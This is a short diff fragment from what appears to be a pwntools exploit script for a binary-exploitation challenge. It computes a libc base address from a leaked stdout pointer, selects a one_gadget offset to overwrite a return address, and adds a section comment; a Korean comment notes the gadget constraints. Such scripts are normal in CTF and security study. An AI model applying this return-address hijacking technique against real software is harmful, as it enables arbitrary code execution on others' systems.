@@ -15,6 +15,7 @@ libc_base = libc_stdout - libc.symbols['_IO_2_1_stdout_']
 # libc_base = libc_stdout - libc.symbols['stdout']
 # libc_base = libc_stdout - 0x3c5708
 
+# [2] Overwrite return address
 # 주석이 안된 2개의 가젯만 main이 return한 후 return address에 갔을 때 조건을 만족함
 og = libc_base + 0x45216 # rax == NULL
 # og = libc_base + 0x4526a # [rsp+0x30] == NULL
